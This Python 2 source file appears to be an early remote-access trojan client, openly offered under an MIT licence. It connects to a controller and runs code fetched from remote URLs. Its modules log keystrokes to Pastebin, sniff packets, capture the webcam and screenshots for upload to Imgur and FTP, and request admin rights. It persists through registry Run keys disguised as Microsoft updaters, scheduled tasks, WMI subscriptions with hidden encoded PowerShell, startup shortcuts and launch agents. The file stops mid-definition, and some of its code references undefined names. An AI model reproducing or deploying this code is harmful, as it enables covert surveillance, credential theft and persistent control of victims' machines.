#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright (c) 2017 colental
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

''' 

,adPPYYba, 8b,dPPYba,   ,adPPYb,d8 88,dPPYba,  aa       aa
""     `Y8 88P'   `"8a a8"    `Y88 88P'   `"8a 88       88
,adPPPPP88 88       88 8b       88 88	       8b	88
88,    ,88 88       88 "8a,   ,d88 88	       "8a,   ,d88
`"8bbdP"Y8 88       88  `"YbbdP"Y8 88           `"YbbdP"Y8
                        aa,    ,88 	        aa,    ,88
                         "Y8bbdP"          	 "Y8bbdP'

                                               88                          ,d
                                               88                          88
 ,adPPYba,  ,adPPYb,d8  ,adPPYb,d8 8b,dPPYba,  88 ,adPPYYba, 8b,dPPYba,    88
a8P     88 a8"    `Y88 a8"    `Y88 88P'    "8a 88 ""     `Y8 88P'   `"8a MM88MMM
8PP""""""" 8b       88 8b       88 88       d8 88 ,adPPPPP88 88       88   88
"8b,   ,aa "8a,   ,d88 "8a,   ,d88 88b,   ,a8" 88 88,    ,88 88       88   88
 `"Ybbd8"'  `"YbbdP"Y8  `"YbbdP"Y8 88`YbbdP"'  88 `"8bbdP"Y8 88       88   88,
            aa,    ,88  aa,    ,88 88                                      "Y888
             "Y8bbdP"    "Y8bbdP"  88

'''

import os
import sys
import time
import json
import socket
import pickle
import subprocess
from mss import mss
from uuid import uuid1
from ftplib import FTP
from struct import pack
from random import choice
from imp import new_module
from tempfile import mktemp
from zipfile import ZipFile
from requests import request
from threading import Thread
from logging import getLogger
from urllib import urlretrieve
from Crypto.Cipher import AES
from Crypto.Hash import HMAC, SHA256
from base64 import b64encode, b64decode
from logging.handlers import SocketHandler
from Crypto.Util.number import long_to_bytes, bytes_to_long
if os.name is 'nt':
    from ctypes import windll
    from pyHook import HookManager
    from pythoncom import PumpMessages
    from win32com.shell.shell import ShellExecuteEx
    from _winreg import OpenKey, SetValueEx, CloseKey, HKEY_CURRENT_USER, REG_SZ, KEY_WRITE
    from cv2 import VideoCapture, VideoWriter, VideoWriter_fourcc, imwrite, waitKey
else:
    from pyxhook import HookManager



class Client(object):
    global __command__
    global __modules__
    __command__ = {}
    __modules__ = {}
    def __init__(self, *args, **kwargs):
        [setattr(self, chr(i), kwargs.get(chr(i))) for i in range(97,123) if chr(i) in kwargs]
        time.clock()
        self.mode       = 0
        self.exit       = 0
        self.threads    = {}
        self.cmds       = __command__
        self.mods       = __modules__
        self.info       = self._info()
        self.logger     = self._logger()
        self.result     = self._result()

# ----------------- PRIVATE FUNCTIONS --------------------------

    def _pad(self, s):
        return s + (AES.block_size - len(bytes(s)) % AES.block_size) * b'\0'

    def _hidden_process(self, path, shell=False):
        info = subprocess.STARTUPINFO()
        info.dwFlags = subprocess.STARTF_USESHOWWINDOW|subprocess.CREATE_NEW_PROCESS_GROUP
        info.wShowWindow = subprocess.SW_HIDE
        p = subprocess.Popen(path, startupinfo=info)
        return p

    def _target(self, **kwargs):
        try:
            ab = request('GET', long_to_bytes(long(self.a)), headers={'API-Key': long_to_bytes(long(self.b))}).json() 
            return ab[ab.keys()[0]][0].get('ip')
        except Exception as e:
            if self.v:
                print 'Target error: {}'.format(str(e))
    
    def _connect(self, host='localhost', port=1337):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            print 'Connecting to {}:{}...'.format(host, port)
            s.connect((host, port))
            return s
        except Exception as e:
            if self.v:
                print 'Connection error: {}'.format(str(e))
            time.sleep(10)
            return self._connect(host, port)

    def _send(self, data, method='default'):
        try:
            block = data[:4096]
            data  = data[len(block):]
            ciphertext  = self._encrypt(block)
            msg = '{}:{}\n'.format(method, ciphertext)
            try:
                self.socket.sendall(msg)
            except socket.error: return
            if len(data):
                return self._send(data, method)
        except Exception as e:
            if self.v:
                print 'Send error: {}'.format(str(e))

    def _receive(self):
        try:
            data = ""
            self.socket.setblocking(False) if self.mode else self.socket.setblocking(True)
            while "\n" not in data:
                try:
                    data += self.socket.recv(1024)
                except socket.error: return
            data = self._decrypt(data.rstrip()) if len(data) else data
            return data
        except Exception as e:
            if self.v:
                print 'Receive error: {}'.format(str(e))

    def _diffiehellman(self, bits=2048):
        try:
            p = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
            g = 2
            a = bytes_to_long(os.urandom(32))
            xA = pow(g, a, p)
            self.socket.sendall(long_to_bytes(xA))
            xB = bytes_to_long(self.socket.recv(256))
            x = pow(xB, a, p)
            return SHA256.new(long_to_bytes(x)).digest()
        except Exception as e:
            if self.v:
                print 'Diffie-Hellman error: {}'.format(str(e))

    def _encrypt(self, plaintext):
        try:
            text = self._pad(bytes(plaintext))
            iv = os.urandom(AES.block_size)
            cipher = AES.new(self.dhkey[:16], AES.MODE_CBC, iv)
            ciphertext = iv + cipher.encrypt(text)
            hmac_sha256 = HMAC.new(self.dhkey[16:], msg=ciphertext, digestmod=SHA256).digest()
            output = b64encode(ciphertext + hmac_sha256)
            return output
        except Exception as e:
            if self.v:
                print 'Error: {}'.format(str(e))

    def _decrypt(self, ciphertext):
        try:
            ciphertext  = b64decode(ciphertext)
            iv          = ciphertext[:AES.block_size]
            cipher      = AES.new(self.dhkey[:16], AES.MODE_CBC, iv)
            check_hmac  = ciphertext[-SHA256.digest_size:]
            calc_hmac   = HMAC.new(self.dhkey[16:], msg=ciphertext[:-SHA256.digest_size], digestmod=SHA256).digest()
            output      = cipher.decrypt(ciphertext[len(iv):-SHA256.digest_size])
            if check_hmac != calc_hmac:
                self.logger.log(40, 'HMAC-SHA256 hash authentication check failed - transmission may have been compromised', extra={'submodule': self.name})
            return output.rstrip(b'\0')
        except Exception as e:
            if self.v:
                print 'Decryption error: {}'.format(str(e))

    def _obfuscate(self, data, encoding=None):
        data    = bytes(data)
        p       = []
        n       = len(data)
        block   = os.urandom(2)
        for i in xrange(2, 10000):
            is_mul = False
            for j in p:
                if i % j == 0:
                    is_mul = True
                    block += os.urandom(1)
                    break
            if not is_mul:
                if len(data):
                    p.append(i)
                    block += data[0]
                    data = data[1:]
                else:
                    return b64encode(block)

    def _deobfuscate(block, encoding=None):
        p = []
        block = b64decode(block)
        for i in xrange(2, len(block)):
            is_mul = False
            for j in p:
                if i % j == 0:
                    is_mul = True
                    break
            if not is_mul:
                p.append(i)
        return str().join([block[i] for i in p])

    def _use(self, module):
        try:
            getattr(self, module).status = True
            return "'{}' enabled.".format(module.title())
        except Exception as e:
            if self.v:
                print "Error: {}".format(str(e))

    def _stop(self, module):
        try:
            getattr(self, module).status = False
            return "'{}' disabled.".format(module.title())
        except Exception as e:
            if self.v:
                print "Error: {}".format(str(e))

    def _options(self, module=None):
        modules = [_ for _ in self.mods] if not module else [module]
        return self._show({m: m.options for m in modules})

    def _show(self, dict_or_json):
        try:
            results = json.dumps(dict_or_json, indent=2, separators=(',','\t'))
        except Exception as e:
            try:
                string_repr = repr(dict_or_json)
                string_repr = string_repr.replace('None', 'null').replace('True', 'true').replace('False', 'false').replace("u'", "'").replace("'", '"')
                string_repr = re.sub(r':(\s+)(<[^>]+>)', r':\1"\2"', string_repr)
                string_repr = string_repr.replace('(', '[').replace(')', ']')
                results     = json.dumps(json.loads(string_repr), indent=2, separators=(', ', '\t'))
            except:
                results = repr(dict_or_json)
        return results


    def _info(self, **args):
        return {'IP Address': self._ip(),'Platform': sys.platform,'Localhost': socket.gethostbyname(socket.gethostname()),'MAC Address': '-'.join(uuid1().hex[20:].upper()[i:i+2] for i in range(0,11,2)),'Login': os.getenv('USERNAME') if os.name is 'nt' else os.getenv('USER'),'Machine': os.getenv('COMPUTERNAME') if os.name is 'nt' else os.getenv('NAME'),'Admin': bool(windll.shell32.IsUserAnAdmin()) if os.name is 'nt' else bool(os.getuid() == 0),'Device': subprocess.check_output('VER',shell=True).rstrip() if os.name is 'nt' else subprocess.check_output('uname -a', shell=True).rstrip()}

    def _results(self):
        return {module:{} for module in self.mods}

    def _ip(self):
        sources = ['http://api.ipify.org','http://v4.ident.me','http://canihazip.com/s']
        for target in sources:
            try:
                ip = request('GET', target).content
                if socket.inet_aton(ip):
                    return ip
            except: pass

    def _get_admin(self):
        info = self.info()
        if info['Admin']:
            return {'User': info['login'], 'Administrator': info['admin']}
        if self.f:
            if os.name is 'nt':
                ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(long_to_bytes(long(self.f))))
            else:
                return "Privilege escalation on platform: '{}' is not yet available".format(sys.platform)

    def _create_module_from_url(self, uri, name=None):
        name    = os.path.splitext(os.path.basename(uri))[0] if not name else name
        module  = new_module(name)
        source  = request('GET', uri).content
        code    = compile(source, name, 'exec')
        exec code in module.__dict__
        globals()[name] = module
        sys.modules[name] = module
        return module

    def _powershell(self, cmdline):
        try:
            info = subprocess.STARTUPINFO()
            info.dwFlags = sub.STARTF_USESHOWWINDOW
            info.wShowWindow = sub.SW_HIDE
            command=['powershell.exe', '/c', cmdline]
            p = subprocess.Popen(command, startupinfo=info, stderr=subprocess.STDOUT, stdout=subprocess.PIPE, universal_newlines=True)
            results, _ = p.communicate()
            return results
        except Exception as e:
            if self.v:
                print 'Powershell error: {}'.format(str(e))

    def _logger(self, port=4321):
        module_logger = getLogger(self._ip())
        module_logger.handlers = []
        socket_handler = SocketHandler(self._target(o=long(self.a), p=long(self.b)), port)
        module_logger.addHandler(socket_handler)
        return module_logger

    def _imgur(self, filename):
        with open(filename, 'rb') as fp:
            data = b64encode(fp.read())
        os.remove(filename)
        result = request('POST', 'https://api.imgur.com/3/upload', headers={'Authorization': long_to_bytes(long(self.e))}, data={'image': data, 'type': 'base64'}).json().get('data').get('link')
        return result

    def _pastebin(self, text):
        result = request('POST', 'https://pastebin.com/api/api_post.php', data={'api_dev_key': long_to_bytes(long(self.c)), 'api_user_key': long_to_bytes(long(self.d)), 'api_option': 'paste', 'api_paste_code': text}).content
        return result
    
    def _ftp(self, filepath):
        try:
            host = FTP(*long_to_bytes(self.q).split())
            if self.info().get('IP Address') not in host.nlst('/htdocs'):
                host.mkd('/htdocs/{}'.format(self.info().get('IP Address')))
            result = '/htdocs/{}/{}'.format(self.info().get('IP Address'), os.path.basename(filepath))
            upload = host.storbinary('STOR ' + result, open(filepath, 'rb'))
        except Exception as e:
            result = str(e)
        return result
        
# ----------------- KEYLOGGER --------------------------

    def keylogger_event(self, event):
        if event.WindowName != self.keylogger.options['window']:
            self.keylogger.options['window'] = event.WindowName
            self.keylogger.options['buffer'] += "\n[{}]\n".format(self.keylogger.options['window'])
        if event.Ascii > 32 and event.Ascii < 127:
            self.keylogger.options['buffer'] += chr(event.Ascii)
        elif event.Ascii == 32:
            self.keylogger.options['buffer'] += ' '
        elif event.Ascii in (10,13):
            self.keylogger.options['buffer'] += ('\n')
        elif event.Ascii == 8:
            self.keylogger.options['buffer'] = self.keylogger.options['buffer'][:-1]
        else:
            pass
        return True
        
    def keylogger_helper(self):
        while True:
            if self.exit:
                if len(self.keylogger.options['buffer']):
                    result  = self._pastebin(self.keylogger.options['buffer'])
                    if self.mode:
                        self.logger.log(40, result, extra={'submodule':'keylogger'})
                    else:
                        self.result['keylogger'].update({time.ctime(): result})
                break
            if time.time() < self.keylogger.options['next_upload']:
                time.sleep(10)
            else:
                if len(self.keylogger.options['buffer']) > self.keylogger.options['max_bytes']:
                    result  = self._pastebin(self.keylogger.options['buffer'])
                    if self.mode:
                        self.logger.log(40, result, extra={'submodule':'keylogger'})
                    else:
                        self.result['keylogger'].update({time.ctime(): result})
                    self.keylogger.options['buffer'] = ''
                self.keylogger.options['next_upload'] += 300.0

    def keylogger_manager(self):
            self.threads['keylogger_helper'] = Thread(target=self.keylogger_helper, name=time.time())
            self.threads['keylogger_helper'].start()
            while True:
                if self.exit:
                    break
                hm = HookManager()
                hm.KeyDown = self.keylogger_event
                hm.HookKeyboard()
                if os.name is 'nt':
                    PumpMessages()
                else:
                    time.sleep(0.1)

# ----------------- PACKETSNIFFER --------------------------

    def packetsniffer_udp_header(self, data):
        try:
            udp_hdr = struct.unpack('!4H', data[:8])
            src     = udp_hdr[0]
            dst     = udp_hdr[1]
            length  = udp_hdr[2]
            chksum  = udp_hdr[3]
            data    = data[8:]
            self.packetsniffer.options['buffer'].append('|================== UDP HEADER ==================|')
            self.packetsniffer.options['buffer'].append('|================================================|')
            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Source', src))
            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Dest', dst))
            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Length', length))
            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Check Sum', chksum))
            self.packetsniffer.options['buffer'].append('|================================================|')
            return data
        except Exception as e:
            self.packetsniffer.options['buffer'].append("Error in {} header: '{}'".format('UDP', str(e)))

    def packetsniffer_tcp_header(self, recv_data):
        try:
            tcp_hdr  = struct.unpack('!2H2I4H', recv_data[:20])
            src_port = tcp_hdr[0]
            dst_port = tcp_hdr[1]
            seq_num  = tcp_hdr[2]
            ack_num  = tcp_hdr[3]
            data_ofs = tcp_hdr[4] >> 12
            reserved = (tcp_hdr[4] >> 6) & 0x03ff
            flags    = tcp_hdr[4] & 0x003f
            flagdata = {
                'URG' : bool(flags & 0x0020),
                'ACK' : bool(flags & 0x0010),
                'PSH' : bool(flags & 0x0008),
                'RST' : bool(flags & 0x0004),
                'SYN' : bool(flags & 0x0002),
                'FIN' : bool(flags & 0x0001)
            }
            win = tcp_hdr[5]
            chk_sum = tcp_hdr[6]
            urg_pnt = tcp_hdr[7]
            recv_data = recv_data[20:]

            self.packetsniffer.options['buffer'].append('|================== TCP HEADER ==================|')
            self.packetsniffer.options['buffer'].append('|================================================|')
            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Source', src_port))
            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Target', dst_port))
            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Seq Num', seq_num))
            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t |'.format('Ack Num', ack_num))
            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t |'.format('Flags', ', '.join([flag for flag in flagdata if flagdata.get(flag)])))
            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Window', win))
            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Check Sum', chk_sum))
            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Urg Pnt', urg_pnt))
            self.packetsniffer.options['buffer'].append('|================================================|')
            return recv_data
        except Exception as e:
            self.packetsniffer.options['buffer'].append("Error in {} header: '{}'".format('TCP', str(e)))

    def packetsniffer_ip_header(self, data):
        try:
            ip_hdr  = struct.unpack('!6H4s4s', data[:20]) 
            ver     = ip_hdr[0] >> 12
            ihl     = (ip_hdr[0] >> 8) & 0x0f
            tos     = ip_hdr[0] & 0x00ff 
            tot_len = ip_hdr[1]
            ip_id   = ip_hdr[2]
            flags   = ip_hdr[3] >> 13
            fragofs = ip_hdr[3] & 0x1fff
            ttl     = ip_hdr[4] >> 8
            ipproto = ip_hdr[4] & 0x00ff
            chksum  = ip_hdr[5]
            src     = socket.inet_ntoa(ip_hdr[6])
            dest    = socket.inet_ntoa(ip_hdr[7])
            data    = data[20:]

            self.packetsniffer.options['buffer'].append('|================== IP HEADER ===================|')
            self.packetsniffer.options['buffer'].append('|================================================|')
            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('VER', ver))
            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('IHL', ihl))
            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('TOS', tos))
            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Length', tot_len))
            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('ID', ip_id))
            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Flags', flags))
            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Frag Offset', fragofs))
            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('TTL', ttl))
            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Next Protocol', ipproto))
            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Check Sum', chksum))
            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t |'.format('Source IP', src))
            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t |'.format('Dest IP', dest))
            self.packetsniffer.options['buffer'].append('|================================================|')
            return data, ipproto
        except Exception as e:
            self.packetsniffer.options['buffer'].append("Error in {} header: '{}'".format('IP', str(e)))


    def packetsniffer_ethernet_header(self, data):
        try:
            ip_bool = False
            eth_hdr = struct.unpack('!6s6sH', data[:14])
            dst_mac = binascii.hexlify(eth_hdr[0])
            src_mac = binascii.hexlify(eth_hdr[1])
            proto   = eth_hdr[2] >> 8

            self.packetsniffer.options['buffer'].append('|================================================|')
            self.packetsniffer.options['buffer'].append('|================== ETH HEADER ==================|')
            self.packetsniffer.options['buffer'].append('|================================================|')
            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t |'.format('Target MAC', '{}:{}:{}:{}:{}:{}'.format(dst_mac[0:2],dst_mac[2:4],dst_mac[4:6],dst_mac[6:8],dst_mac[8:10],dst_mac[10:12])))
            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t |'.format('Source MAC', '{}:{}:{}:{}:{}:{}'.format(src_mac[0:2],src_mac[2:4],src_mac[4:6],src_mac[6:8],src_mac[8:10],src_mac[10:12])))
            self.packetsniffer.options['buffer'].append('|{:>20} | {}\t\t\t |'.format('Protocol', proto))
            self.packetsniffer.options['buffer'].append('|================================================|')

            if proto == 8:
                ip_bool = True
            data = data[14:]
            return data, ip_bool
        except Exception as e:
            self.packetsniffer.options['buffer'].append("Error in {} header: '{}'".format('ETH', str(e)))

    def packetsniffer_manager(self, seconds):
        limit = time.time() + float(seconds)
        sniffer_socket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        while time.time() < limit:
            try:
                recv_data = sniffer_socket.recv(2048)
                recv_data, ip_bool = packetsniffer_ethernet_header(recv_data)
                if ip_bool:
                    recv_data, ip_proto = packetsniffer_ip_header(recv_data)
                    if ip_proto == 6:
                        recv_data = packetsniffer_tcp_header(recv_data)
                    elif ip_proto == 17:
                        recv_data = packetsniffer_udp_header(recv_data)
            except: break
        try:
            sniffer_socket.close()
        except: pass
        result = self._pastebin('\n'.join(self.packetsniffer.options['buffer']))
        self.result['packetsniffer'][time.ctime()] = result
        self.packetsniffer.options['buffer'] = []
        return result

# ----------------- WEBCAM --------------------------

    def webcam_image(self):
        dev = VideoCapture(0)
        tmp = mktemp(suffix='.png') if os.name is 'nt' else mktemp(prefix='.', suffix='.png')
        r,f = dev.read()
        waitKey(1)
        imwrite(tmp, f)
        dev.release()
        self.result['webcam'][time.ctime()] = self._imgur(tmp)

    def webcam_stream(self):
        dev = VideoCapture(0)
        s   = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self._target(o=long(self.a), p=long(self.b)), port))
        while True:
            ret, frame = dev.read()
            data = pickle.dumps(frame)
            try:
                self._send(pack("L", len(data))+data)
            except:
                dev.release()
                break

    def webcam_video(self):
        fpath   = mktemp(suffix='.avi')
        fourcc  = VideoWriter_fourcc(*'DIVX') if os.name is 'nt' else VideoWriter_fourcc(*'XVID')
        output  = VideoWriter(fpath, fourcc, 20.0, (640,480))
        dev     = VideoCapture(0)
        end     = time.time() + 5.0
        while True:
            ret, frame = dev.read()
            output.write(frame)
            if waitKey(0) and time.time() > end: break
        dev.release()
        self.result['webcam'][time.ctime()] = self._ftp(fpath)

# ----------------- PERSISTENCE --------------------------

    def add_scheduled_task_persistence(self):
        if self.f:
            task_run    = long_to_bytes(long(self.f))
            task_name   = os.path.splitext(os.path.basename(task_run))[0]
            try:
                if subprocess.call('SCHTASKS /CREATE /TN {} /TR {} /SC hourly /F'.format(task_name, task_run), shell=True) == 0:
                    return True
            except Exception as e:
                if self.v:
                    print 'Add scheduled task error: {}'.format(str(e))
        return False

    def remove_scheduled_task_persistence(self):
        if self.f:
            try:
                task_name = name or os.path.splitext(os.path.basename(long_to_bytes(long(self.f))))[0]
                if subprocess.call('SCHTASKS /DELETE /TN {} /F'.format(task_name), shell=True) == 0:
                    return True
            except: pass
            return False

    def add_startup_file_persistence(self):
        if self.f:
            try:
                appdata = os.path.expandvars("%AppData%")
                startup_dir = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
                if os.path.exists(startup_dir):
                    random_name = str().join([choice([chr(i).lower() for i in range(123) if chr(i).isalnum()]) for _ in range(choice(range(6,12)))])
                    persistence_file = os.path.join(startup_dir, '%s.eu.url' % random_name)
                    content = '\n[InternetShortcut]\nURL=file:///%s\n' % long_to_bytes(long(self.f))
                    with file(persistence_file, 'w') as fp:
                        fp.write(content)
                    return True
            except Exception as e:
                if self.v:
                    print 'Adding startup file error: {}'.format(str(e))
        return False

    def remove_startup_file_persistence(self):
        appdata     = os.path.expandvars("%AppData%")
        startup_dir = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
        if os.path.exists(startup_dir):
            for f in os.listdir(startup_dir):
                filepath = os.path.join(startup_dir, f)
                if filepath.endswith('.eu.url'):
                    try:
                        os.remove(filepath)
                        return True
                    except: pass
                    return False

    def add_registry_key_persistence(self, cmd=None, name='MicrosoftUpdateManager'):
        reg_key = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE)
        value   = cmd or long_to_bytes(long(self.f))
        try:
            SetValueEx(reg_key, name, 0, REG_SZ, value)
            CloseKey(reg_key)
            return True
        except Exception as e:
            if self.v:
                print 'Remove registry key error: {}'.format(str(e))
        return False

    def remove_registry_key_persistence(self, name='MicrosoftUpdateManager'):
        try:
            key = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
            DeleteValue(key, name)
            CloseKey(key)
            return True
        except: pass
        return False

    def add_wmi_object_persistence(self, command=None, name='MicrosoftUpdaterManager'):
        try:
            if self.f:
                filename = long_to_bytes(long(self.f))
                if not os.path.exists(filename):
                    return 'Error: file not found: {}'.format(filename)
                cmd_line = filename
            else:
                cmd_line = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(command.encode('UTF-16LE')))
            startup = "'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
            powershell = request('GET', long_to_bytes(self.s)).content.replace('[STARTUP]', startup).replace('[COMMAND_LINE]', cmd_line).replace('[NAME]', name)
            self._powershell(powershell)
            code = "Get-WmiObject __eventFilter -namespace root\\subscription -filter \"name='%s'\"" % name
            result = self._powershell(code)
            if name in result:
                return True
        except Exception as e:
            if self.v:
                print 'WMI persistence error: {}'.format(str(e))
        return False

    def remove_wmi_object_persistence(self, name='MicrosoftUpdaterManager'):
        try:
            code =''' 
            Get-WmiObject __eventFilter -namespace root\subscription -filter "name='[NAME]'"| Remove-WmiObject
            Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='[NAME]'" | Remove-WmiObject
            Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.filter -match '[NAME]'} | Remove-WmiObject'''.replace('[NAME]', name)
            result = self._powershell(code)
            if not result:
                return True
        except: pass
        return False

    def add_hidden_file_persistence(self):
        try:
            name = os.path.basename(long_to_bytes(long(self.f)))
            if os.name is 'nt':
                hide = subprocess.call('attrib +h {}'.format(name), shell=True) == 0
            else:
                hide = subprocess.call('mv {} {}'.format(name, '.' + name), shell=True) == 0
                if hide:
                    self.f = bytes_to_long(os.path.join(os.path.dirname('.' + name), '.' + name))
            if hide:
                return True
        except Exception as e:
            if self.v:
                print 'Adding hidden file error: {}'.format(str(e))
        return False

    def remove_hidden_file_persistence(self, *args, **kwargs):
        try:
            return subprocess.call('attrib -h {}'.format(long_to_bytes(long(self.f))), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0
        except Exception as e:
            if self.v:
                print 'Error unhiding file: {}'.format(str(e))
        return False
            

    def add_launch_agent_persistence(self, name='com.apple.update.manager'):
        try:
            code    = request('GET', long_to_bytes(self.g)).content
            label   = name
            fpath   = mktemp(suffix='.sh')
            bash    = code.replace('__LABEL__', label).replace('__FILE__', long_to_bytes(long(self.f)))
            fileobj = file(fpath, 'w')
            fileobj.write(bash)
            fileobj.close()
            self.result['persistence']['launch agent'] = '~/Library/LaunchAgents/{}.plist'.format(label)
            bin_sh  = bytes().join(subprocess.Popen('/bin/sh {}'.format(x), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
            return True
        except Exception as e2:
            if self.v:
                print 'Error: {}'.format(str(e2))
        return False

    def remove_launch_agent_persistence(self, name=None):
        try:
            name = name or os.path.splitext(os.path.basename(long_to_bytes(long(self.f))))[0]
            os.remove('~/Library/LaunchAgents/{}.plist'.format(name))
            return True
        except: pass
        return False

# ----------------- PUBLIC FUNCTIONS --------------------------

    def command(fx, cx=__command__):
        cx.update({ fx.func_name : fx })
        return fx

    def modules(fx, mx=__modules__):
        if fx.func_name is 'persistence':
            fx.platforms = ['win32','darwin']
            fx.options = {'methods': ['registry key', 'scheduled task', 'wmi object', 'startup file', 'hidden file'] if os.name is 'nt' else ['launch agent', 'hidden file']}

        elif fx.func_name is 'keylogger':
            fx.platforms = ['win32','darwin','linux2']
            fx.options = {'max_bytes': 1024, 'next_upload': time.time() + 300.0, 'buffer': bytes(), 'window': None}
            
        elif fx.func_name is 'webcam':
            fx.platforms = ['win32']
            fx.options = {'image': True, 'video': False}
                        
        elif fx.func_name is 'packetsniffer':
            fx.platforms = ['darwin','linux2']
            fx.options  = { 'next_upload': time.time() + 300.0, 'buffer': []}
            
        elif fx.func_name is 'screenshot':
            fx.platforms = ['win32','linux2','darwin']
            fx.options = {}
            
        fx.status = True if sys.platform in fx.platforms else False
        mx.update({fx.func_name: fx})
        return fx

    @modules
    def persistence(self):
        for method in self.persistence.options['methods']:
            if method not in self.result['persistence']:
                result = getattr(self, 'add_{}_{}_persistence'.format(*method.split()))()
                self.result['persistence'].update({ method : result })
        _ = self.threads.pop('persistence', None)
        return result

    @modules
    def screenshot(self):
        tmp = mktemp(suffix='.png')
        with mss() as screen:
            img = screen.shot(output=tmp)
        result = self._imgur(img)
        self.result['screenshot'].update({ time.ctime() : result })
        _ =  self.threads.pop('screenshot', None)
        return result

    @modules
    def keylogger(self):
        if 'keylogger' in self.threads:
            if not self.threads['keylogger'].is_alive():
                self.threads['keylogger'] = Thread(target=self.keylogger_manager, name=time.time())
                self.threads['keylogger'].start()
                result = 'Keylogger started at {}'.format(time.ctime())
            else:
                runtime = time.time() - float(self.threads['keylogger'].name)
                result  = 'Current session duration: {}'.format(self.status(runtime))
        else:
            self.threads['keylogger'] = Thread(target=self.keylogger_manager, name=time.time())
            self.threads['keylogger'].start()
            result = 'Keylogger started at {}'.format(time.ctime())
        self.result['keylogger'].update({ time.ctime() : result })
        _ = self.threads.pop('keylogger', None)
        return result

    @modules
    def webcam(self):
        if self.webcam.options['image']:
            result = self.webcam_image()
        elif self.webcam.options['video']:
            result = self.webcam_video()
        self.result['webcam'].update({ time.ctime() : result })
        _ = self.threads.pop('webcam', None)
        return result

    @modules
    def packetsniffer(self):
        if 'packetsniffer' not in self.threads:
            try:
                result  = self.packetsniffer_manager(self.packetsniffer.options['seconds'])
            except Exception as e:
                result  = 'Error monitoring network traffic: {}'.format(str(e))
            _ = self.threads.pop('packetsniffer', None)
        else:
            result = 'packetsniffer is already monitoring network traffic'
        self.result['packetsniffer'].update({ time.ctime() : result })
        _ = self.threads.pop('packetsniffer', None)
        return result

    @command
